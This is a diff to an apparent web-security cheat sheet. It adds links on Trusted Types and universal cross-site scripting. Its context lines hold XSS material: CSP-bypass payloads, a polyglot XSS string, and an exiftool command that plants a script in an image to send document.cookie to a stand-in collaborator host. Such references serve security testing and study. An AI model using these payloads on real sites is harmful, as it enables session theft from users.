@@ -635,6 +635,7 @@ Mitigations:
             ```
 - [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
     - https://csp-evaluator.withgoogle.com
+    - https://eiv.dev/trusted-types/
     - bypass: using valid elements/attributes
         - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
         - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
@@ -712,6 +713,10 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
     ```bash
     exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
     ```
+
+### Universal Cross-Site Scripting (UXSS)
+
+- [GitHub \- Metnew/uxss\-db: 🔪Browser logic vulnerabilities](https://github.com/Metnew/uxss-db)
 
 # SQL Injection (SQLI)
 
